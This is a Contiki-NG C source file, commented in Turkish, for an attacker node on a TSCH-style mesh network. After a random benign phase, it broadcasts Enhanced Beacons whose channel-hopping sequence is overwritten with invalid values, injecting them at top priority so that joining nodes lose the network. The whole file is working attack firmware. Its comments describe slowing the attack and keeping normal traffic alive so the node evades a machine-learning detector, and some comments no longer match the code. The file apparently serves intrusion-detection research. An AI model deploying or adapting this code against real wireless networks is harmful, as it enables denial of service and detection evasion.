/*
 * "Timekeep" saldirisi — ISIMLENDIRME NOTU.
 *
 * Tarihsel olarak "timekeep" (zaman-tutma / ASN-desync) adiyla anilsa da, bu
 * istemcinin gercekte yaptigi sey TSCH-Synchronization (ASN) IE'sini degil,
 * EB icindeki KANAL ATLAMA SIRASI (Channel Hopping Sequence) IE'sini
 * bozmaktir (tum kanallar 0xFF). Yani literatur terimiyle bu bir
 * "channel-hopping-sequence EB poisoning" saldirisidir: zehirli EB'yi sync
 * kaynagi olarak benimseyen (yeni katilan/yeniden senkron olan) dugumler
 * yanlis kanal dizisiyle sagir kalir. Klasik ASN/zaman-kaynagi desync
 * saldirisiyla akrabadir ama ayni sey degildir.
 *
 * attack_type enum degeri uyumluluk icin ATTACK_TYPE_TIMEKEEP (=7) olarak
 * birakildi; yayinda/raporda saldiri "channel-hopping-sequence EB poisoning"
 * olarak adlandirilmali.
 */
#include "contiki.h"
#include "net/app-layer/attack-analyzer/attacker-analyzer.h"
#include "net/ipv6/simple-udp.h"
#include "net/linkaddr.h"
#include "net/mac/4emac/4emac-private.h"
#include "net/mac/4emac/4emac-buf.h"
#include "net/mac/4emac/4emac-ie-eb.h"
#include "net/netstack.h"
#include "net/packetbuf.h"
#include "net/routing/routing.h"
#include "random.h"

#include "sys/log.h"
#define LOG_MODULE "TimekeepAttack"
#define LOG_LEVEL LOG_LEVEL_INFO

/* Normal calisma ayarlari */
#define UDP_CLIENT_PORT 8765
#define UDP_SERVER_PORT 5678
#define NORMAL_SEND_INTERVAL (15 * CLOCK_SECOND)
#define JRC_IP_ADDR                                                            \
  {0xfd, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,                             \
   0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x05}
static uip_ipaddr_t jrc_ip_addr;
static struct simple_udp_connection udp_conn;

/*
 * Saldiri modu ayarlari.
 * 500ms -> 2sn: EB zehirleme hizini dusuruyoruz; orijinal 500ms ezici
 * tx_slot_count / dis_sent imzasi birakiyordu. 2sn'de bile EB yarismasi
 * etkili oluyor ama feature uzayinda ortusme alani aciliyor.
 */
/*
 * Stealth v3: 2sn -> 8sn. EB zehirleme oraninda dort kat azalma.
 * 2sn'de tx_slot_count / delta_tx imzasi guclu kaliyordu (F1>0.98).
 * 8sn'de halen kanal-hopping bozulmasi olusturuyor ama feature uzayinda
 * normal dugumler arasinda erime alani aciliyor.
 */
#ifndef TIMEKEEP_ATTACK_INTERVAL
#define TIMEKEEP_ATTACK_INTERVAL (8 * CLOCK_SECOND)
#endif
#define ATTACK_INTERVAL TIMEKEEP_ATTACK_INTERVAL

/*
 * Faz gecisi - 30-min headless run semasinda 3. dk'da atak baslar
 * (timekeep routing-independent).
 */
#define ATTACK_DELAY_MIN (20 * 60 * CLOCK_SECOND)  // 60-min run; attack start random in [20,25] min
#define ATTACK_DELAY_MAX (25 * 60 * CLOCK_SECOND)

/* Dis fonksiyon bildirimleri */
extern int foure_packet_create_eb(uint8_t *buf, int buf_size, uint8_t *hdr_len,
                                  uint8_t *tsch_sync_ie_offset);
extern int ieee802154e_parse_eb_information_elements(const uint8_t *buf,
                                                     uint8_t buf_size,
                                                     struct ieee802154_eb *eb);

extern uint8_t foure_channel_hopping_pattern[];

/* Kanal Atlama (Channel Hopping) IE ID'si */
#define MLME_LONG_IE_TSCH_CHANNEL_HOPPING_SEQUENCE 0x9

/*---------------------------------------------------------------------------*/
/* EB mesajındaki Kanal Atlama Sirasini (Channel Hopping Sequence) manipule eder */
/* Bu fonksiyon Kanal Atlama IE'sini bulur ve sirayi bozar (corrupt eder) */
/*---------------------------------------------------------------------------*/
static int manipulate_channel_hopping_in_eb(uint8_t *eb_buf, int eb_len,
                                            uint8_t hdr_len) {
  uint8_t *buf = eb_buf + hdr_len; // Yuk (Payload) IE'lerinden basla
  int buf_size = eb_len - hdr_len;
  uint16_t ie_desc;
  uint8_t type;
  uint8_t id;
  uint16_t len;
  int nested_mlme_len = 0;
  enum {
    PARSING_PAYLOAD_IE,
    PARSING_MLME_SUBIE
  } parsing_state = PARSING_PAYLOAD_IE;

  /* Kanal Atlama IE'sini bulmak icin tum IE'ler uzerinde donguye gir */
  while (buf_size > 0) {
    if (buf_size < 2) {
      return 0; // Bulunamadi
    }

    /* IE tanimlayicisini (descriptor) oku */
    ie_desc = buf[0] | (buf[1] << 8);
    buf_size -= 2;
    buf += 2;
    type = (ie_desc & 0x8000) ? 1 : 0;

    switch (parsing_state) {
    case PARSING_PAYLOAD_IE:
      if (type != 1) {
        return 0; // Yanlis tip
      }
      len = ie_desc & 0x7ff;         // b0-b10
      id = (ie_desc & 0x7800) >> 11; // b11-b14
      if (id == 0x1) {               // PAYLOAD_IE_MLME
        parsing_state = PARSING_MLME_SUBIE;
        nested_mlme_len = len;
        /* Alt IE'leri ayristiracagimiz (parse) icin buf isaretcisini (pointer) henuz ilerletme */
      } else {
        buf += len;
        buf_size -= len;
      }
      break;

    case PARSING_MLME_SUBIE:
      if (type == 1) {                 // Uzun (Long) IE
        len = ie_desc & 0x7ff;         // b0-b10
        id = (ie_desc & 0x7800) >> 11; // b11-b14

        if (id == MLME_LONG_IE_TSCH_CHANNEL_HOPPING_SEQUENCE) {
          /* Kanal Atlama (Channel Hopping) IE'si bulundu! Manipule et. */
          if (len >= 2 && buf_size >= len) {
            uint8_t sequence_len = buf[1];

            LOG_INFO("TIMEKEEP: Kanal Atlama IE bulundu, siralama bozuluyor "
                     "(uzunluk=%u)\n",
                     sequence_len);

            /* Kanal atlama sirasini boz (corrupt) */
            /* Tum kanallara yanlis veya gecersiz degerler ata (ornek: hepsi 0xFF) */
            if (sequence_len > 0 && sequence_len <= 16 &&
                len >= (2 + sequence_len)) {
              uint8_t i;
              for (i = 0; i < sequence_len; i++) {
                /* Yanlis kanal degerleri ata */
                buf[2 + i] = 0xFF; // Gecersiz kanal adresi
              }
              LOG_INFO("TIMEKEEP: Kanal atlama sirasi tamamen bozuldu! (hepsi 0xFF yapildi)\n");
              return 1; // Basariyla manipule edildi
            }
          }
        }
        /* Bu IE'yi atla */
        buf += len;
        buf_size -= len;
        nested_mlme_len -= (2 + len);
      } else {
        /* Kisa (Short) IE, atla */
        len = ie_desc & 0xff; // b0-b7
        buf += len;
        buf_size -= len;
        nested_mlme_len -= (2 + len);
      }

      /* MLME alt-IE'leri isinin bitip bitmedigini kontrol et */
      if (nested_mlme_len <= 0) {
        parsing_state = PARSING_PAYLOAD_IE;
      }
      break;
    }
  }

  return 0; // Kanal Atlama IE'si bulunamadi
}

/*---------------------------------------------------------------------------*/
PROCESS(timekeep_attack_process, "Zamanlama (Timekeep) Saldirisi Istemcisi");
AUTOSTART_PROCESSES(&timekeep_attack_process);
/*---------------------------------------------------------------------------*/
static void udp_rx_callback(struct simple_udp_connection *c,
                            const uip_ipaddr_t *sender_addr,
                            uint16_t sender_port,
                            const uip_ipaddr_t *receiver_addr,
                            uint16_t receiver_port, const uint8_t *data,
                            uint16_t datalen) {
  unsigned count = *(unsigned *)data;
  LOG_INFO("Cevap (response) %u alindi, gonderen: ", count);
  LOG_INFO_6ADDR(sender_addr);
  LOG_INFO_("\n");
}
/*---------------------------------------------------------------------------*/
PROCESS_THREAD(timekeep_attack_process, ev, data) {
  static struct etimer periodic_timer;
  static struct etimer attack_delay_timer;
  static struct etimer app_send_timer;
  static unsigned count = 0;
  uip_ipaddr_t dest_ipaddr;

  PROCESS_BEGIN();

  /* --- Normal calisma icin yapilandirma baslangici --- */
  uint8_t jrc_addr[16] = JRC_IP_ADDR;
  memcpy(jrc_ip_addr.u8, jrc_addr, 16);
  simple_udp_register(&udp_conn, UDP_CLIENT_PORT, NULL, UDP_SERVER_PORT,
                      udp_rx_callback);
  foure_timesynch_init(0);

  /* Saldirgan analizorunu (analyzer) baslat - baslangicta normal (masum) modda calisir */
  attacker_analyzer_init(0, &udp_conn, (void *)&jrc_ip_addr,
                         (unsigned short)UDP_SERVER_PORT, 0, ATTACK_TYPE_NONE);

  LOG_INFO("TIMEKEEP: Dugum normal modda basliyor. Saldiri tam 30 dakika sonra baslayacak.\n");
  clock_time_t attack_delay = ATTACK_DELAY_MIN + (random_rand() % (ATTACK_DELAY_MAX - ATTACK_DELAY_MIN));
  LOG_INFO("Attack delay drawn: %lu sec (uniform [20,25] min)\n", (unsigned long)(attack_delay / CLOCK_SECOND));
  etimer_set(&attack_delay_timer, attack_delay);
  etimer_set(&periodic_timer, random_rand() % NORMAL_SEND_INTERVAL);

  /* --- Normal Faz Dongusu --- */
  while (!etimer_expired(&attack_delay_timer)) {
    PROCESS_WAIT_EVENT_UNTIL(etimer_expired(&periodic_timer));

    if (etimer_expired(&attack_delay_timer)) {
      break;
    }

    if (NETSTACK_ROUTING.node_is_reachable() &&
        NETSTACK_ROUTING.get_root_ipaddr(&dest_ipaddr)) {
      LOG_INFO("TIMEKEEP: Normal UDP paketi (%u) gonderiliyor: ", count);
      LOG_INFO_6ADDR(&dest_ipaddr);
      LOG_INFO_("\n");
      {
        uint32_t packed = attacker_pack_app_pkt((uint32_t)count);
        simple_udp_sendto(&udp_conn, &packed, sizeof(packed), &dest_ipaddr);
      }
      count++;
      attacker_analyzer_set_app_packet_count(count);
    } else {
      LOG_INFO("TIMEKEEP: Normal mod: Henuz bir ebeveyn rotasi bulunamadi, bekliyor...\n");
    }
    etimer_set(&periodic_timer, NORMAL_SEND_INTERVAL - CLOCK_SECOND +
                                    (random_rand() % (2 * CLOCK_SECOND)));
  }

  /* --- Saldiri Fazi (Zehirlenme Evresi) Dongusu --- */
  printf("==============================================\n");
  printf("*** EB MANIPULASYON SALDIRISI BASLADI ***\n");
  printf("Kanal Atlama sirasi tamamen zehirlenmis EB mesajlari gonderilecek!\n");
  printf("Aralik: Her 500ms'de 1 (Saniyede 2 paket saldirisi)\n");
  printf("Amac: Aga katilan dugumlerin radyo frekans sirasini ele gecirmek\n");
  printf("==============================================\n");
  LOG_INFO("TIMEKEEP: KANAL ATLAMA (CHANNEL HOPPING) MANIPULASYON moduna gecis yapildi\n");

  /* Analizor mod etiketini (Label) guncelle ki Makine Ogrenmesi bunun Atak oldugunu bilsin */
  attacker_analyzer_set_attack_mode(1, ATTACK_TYPE_TIMEKEEP);

  etimer_set(&periodic_timer, ATTACK_INTERVAL);
  etimer_set(&app_send_timer, NORMAL_SEND_INTERVAL);

  while (1) {
    PROCESS_WAIT_EVENT_UNTIL(etimer_expired(&periodic_timer) ||
                             etimer_expired(&app_send_timer));

    /* --- Normal app-send branch (stealth: keep UDP traffic alive during attack) --- */
    if(etimer_expired(&app_send_timer)) {
      if(NETSTACK_ROUTING.node_is_reachable() && NETSTACK_ROUTING.get_root_ipaddr(&dest_ipaddr)) {
        uint32_t packed = attacker_pack_app_pkt((uint32_t)count);
        simple_udp_sendto(&udp_conn, &packed, sizeof(packed), &dest_ipaddr);
        count++;
        attacker_analyzer_set_app_packet_count(count);
      }
      etimer_set(&app_send_timer, NORMAL_SEND_INTERVAL - CLOCK_SECOND + (random_rand() % (2 * CLOCK_SECOND)));
    }

    /* --- EB poisoning branch --- */
    if(!etimer_expired(&periodic_timer)) {
      continue;
    }
    LOG_INFO("TIMEKEEP: Zehirli (bozulmus) kanal atlama sekansina sahip EB gonderiliyor\n");
    /* Not: Burada 'count' sayacini (app_packet_count'i) ARTIRMIYORUZ! 
     * Cunku EB mesajlari Uygulama Katmani (UDP) paketi degil, doğrudan antenin/Radyonun 
     * gonderdigi MAC katmani paketleridir. Saldiri ML algoritmalarina diger davranislardan
     * (delta_tx, yol kayiplari vb.) yansiyacaktir. */

    /* TIMEKEEP (zamanlama) slotlarini tikamak uzere ozel bir EB (Isaretci) paketi hazirla */
    uint8_t eb_buf[FOURE_MAC_MAX_PACKET_LEN];
    uint8_t eb_len, hdr_len = 0;
    uint8_t tsch_sync_ie_offset;

    /* foure_packet_create_eb fonksiyonunu, paketin icine "tam" Kanal Atlama IE'sini zorla dahil etmesi icin kandir */
    uint8_t original_first_channel = foure_channel_hopping_pattern[0];
    foure_channel_hopping_pattern[0] = (original_first_channel == 0xFF)
                                           ? 0xFE
                                           : 0xFF; /* Cihazi varsayilan disi (non-default) zannetmeye zorla */

    /* Gecerli formatta (Valid) bir Gecici EB formati yarat - Daha sonra bunu slot icinde isgal edecegiz */
    eb_len = foure_packet_create_eb(eb_buf, FOURE_MAC_MAX_PACKET_LEN, &hdr_len,
                                    &tsch_sync_ie_offset);

    /* Kendi islemcimizin/MAC katmanimizin orijinal kanal atlama modelini (kendimizi bozmamak icin) tamamen geri yukle */
    foure_channel_hopping_pattern[0] = original_first_channel;

    if (eb_len > 0) {
      /* SALDIRI YAPILDI: Orijinal EB uretildi, simdi Kanal Atlama IE'sinin izini sur ve icini Zehirle (Corrupt) */
      /* Bu hareket kurban dugumleri radyo kanalinda kayip birakip sagir olmalarina yol acacak */
      if (manipulate_channel_hopping_in_eb(eb_buf, eb_len, hdr_len)) {
        LOG_INFO("TIMEKEEP: EB paketi icerisindeki radyo kanal sicrama listesi basariyla BOZULDU (zehirlendi)\n");
      } else {
        LOG_WARN("TIMEKEEP: Bozmak icin Kanal Atlama IE'si bulunamadi, paket guvenli cikti.\n");
      }
      
      /* Zehirlenmis EB'yi dogrudan MAC tamponuna (Buffer) ve kritik TIMEKEEP slot tipine firlat */
      /* Bu islem diger masum cihazlarin zamanlanma esitlemesi yaptigi dilimi (slot) isgal edecek ve o kanallari tasiyacak. */
      /* Acil ve yayinsal (Broadcast) gondermek icin linkaddr_null kullanilir */
      linkaddr_t broadcast_dest;
      linkaddr_copy(&broadcast_dest, &linkaddr_null);

      uint8_t ret = foure_mac_buf_content_insert_data(
          &broadcast_dest, // EB icin yayin hedef adresi
          eb_buf, eb_len, hdr_len,
          IEEE802154_BEACONFRAME, // EB isaretci cerceve formati olarak gonderme emri
          SLOT_TYPE_TIMEKEEP,     // Iste saldrinin puf noktasi: TIMEKEEP slotu seciliyor!
          0,                      // seqno
          PRIORITY_0,             // Kuyrugun en basini secmek (en yuksek oncelik)
          NULL, NULL);

      if (ret == FOURE_RET_OK) {
        LOG_DBG("TIMEKEEP: Zehirli EB paketi basariyla TIMEKEEP (Zaman dilimi) kuyruguna islendi!\n");
      } else {
        LOG_WARN("TIMEKEEP: Zehirli EB paketini kuyruga isleme/Sikistirma BASARISIZ (Hata Kodu=%u)\n", ret);
      }
    } else {
      LOG_WARN("TIMEKEEP: Temel Taslak EB Paketi olusturma sureci basarisiz (Eksik Hafiza Vb.)\n");
    }

    /* Bir sonraki saldiri (Yayin) icin 500 ms (Yarim Saniye) sonraya sayaci kur */
    etimer_set(&periodic_timer, ATTACK_INTERVAL);
  }

  PROCESS_END();
}
/*---------------------------------------------------------------------------*/
